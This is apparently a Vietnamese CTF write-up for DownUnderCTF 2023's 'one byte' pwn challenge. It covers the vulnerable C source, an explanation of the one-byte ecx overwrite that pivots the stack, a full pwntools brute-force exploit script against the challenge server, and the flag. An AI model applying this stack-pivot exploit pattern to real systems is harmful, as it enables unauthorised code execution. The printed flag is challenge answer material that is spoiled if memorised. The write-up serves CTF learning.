# one byte

nhìn đơn giản mà khá đau đầu đó

## source C

```python
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

void init() {
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stdin, 0, 2, 0);
}

void win() {
    system("/bin/sh");
}

int main() {
    init();

    printf("Free junk: 0x%lx\n", init);
    printf("Your turn: ");

    char buf[0x10];
    read(0, buf, 0x11);
}
```

nhìn thì tưởng ret2win baby nhưng mà không phải đâu :)) 

chương trình cho ta địa chỉ của init, dee và **ta leak được exe base**

thử nhập 15byte a xem sao

![image](https://github.com/gookoosss/CTF/assets/128712571/67d33e9d-5952-4851-9b5a-d388f338b021)


hmm ở đây ta ko thay đổi rip được vì nó nằm trên stack ta nhập vào , nhưng mà khoan đã **hãy để ý địa chỉ 0xffffd210 và xem sự thay đổi**

![image](https://github.com/gookoosss/CTF/assets/128712571/0971040a-4350-44f3-8047-da069db085e3)


**lúc này ecx là 0xffffd210 và tiếp theo esp sẽ bằng ecx - 0x4**, hmm nếu vậy ta hoàn toàn có thể thay đổi được 1 byte ecx thành địa chỉ chứa shell ta cần để ret2win như bình thường

bây giờ ta thử ret2win xem sao, byte cuối ta cho đại là "d" đi thành đuôi 64

```python 
exe_leak = int(p.recvline()[:-1], 16)
exe.address = exe_leak - 0x11bd

log.info("exe leak: " + hex(exe_leak))
log.info("exe base: " + hex(exe.address))

payload = p32(exe.sym['win'])
payload += p32(exe.sym['win'])
payload += p32(exe.sym['win'])
payload += p32(exe.sym['win'])
payload += b'd'

p.send(payload)
```
![image](https://github.com/gookoosss/CTF/assets/128712571/e98c1a65-190f-40c7-b6a3-413982f4520f)


hmm vấn đề ở đây là ta ko có địa chỉ stack nên ko leak được địa chỉ nào chứa win cả , nên ta đành phải brute force đến khi nào lấy shell thì thoi

![image](https://github.com/gookoosss/CTF/assets/128712571/6e62a73c-dc07-4809-8138-fbba40ca9576)

dee tầm 10s là ta có shell rồi

## script

```python 
from pwn import *

while True:
    # p = process('./onebyte')
    p = remote('2023.ductf.dev', 30018)
    exe = ELF('./onebyte')

    p.recvuntil(b'junk: ')

    # gdb.attach(p, gdbscript = '''
    # b*main+93
    # c
    # ''')

    # input()

    exe_leak = int(p.recvline()[:-1], 16)
    exe.address = exe_leak - 0x11bd

    log.info("exe leak: " + hex(exe_leak))
    log.info("exe base: " + hex(exe.address))

    payload = p32(exe.sym['win'])
    payload += p32(exe.sym['win'])
    payload += p32(exe.sym['win'])
    payload += p32(exe.sym['win'])
    payload += b'd'

    p.send(payload)

    try:
        p.sendline(b'echo ABCDABCD')
        p.recvuntil(b'ABCDABCD')
        break
    except:
        try:
            p.close()
        except:
            pass

p.interactive()

# DUCTF{all_1t_t4k3s_is_0n3!}
```

## Flag 

DUCTF{all_1t_t4k3s_is_0n3!}









